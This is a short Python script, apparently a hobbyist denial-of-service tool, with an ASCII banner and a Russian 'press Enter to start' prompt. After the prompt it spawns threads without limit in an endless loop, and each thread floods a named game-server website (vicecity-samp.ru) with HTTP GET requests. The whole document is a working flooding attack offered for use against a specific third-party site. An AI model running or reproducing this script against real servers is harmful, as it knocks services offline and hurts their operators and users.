# coding: utf8
import threading
import requests
import os
print("""


╭━━━╮╱╱╱╱╱╭╮╱╭━━━╮╱╱╱╱╱╱╭━╮╭━╮╱╱╭╮╱╱╭╮
┃╭━━╯╱╱╱╱╱┃┃╱╰╮╭╮┃╱╱╱╱╱╱┃┃╰╯┃┃╱╱┃┃╱╱┃┃
┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮┃╭╮╭╮┣━━┫╰━┳┫┃╭━━╮
┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫┃┃┃┃┃┃╭╮┃╭╮┣┫┃┃┃━┫
┃┃╱╱┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃┃┃┃┃┃┃╰╯┃╰╯┃┃╰┫┃━┫
╰╯╱╱╰━━┻━━┻╯╰┻━━━┻━━┻━━╯╰╯╰╯╰┻━━┻━━┻┻━┻━━╯

""")
input("Нажмите на Enter чтобы начать!")

def dos():
 while True:
  requests.get("https://vicecity-samp.ru")
  
while True:
 threading.Thread(target=dos).start()
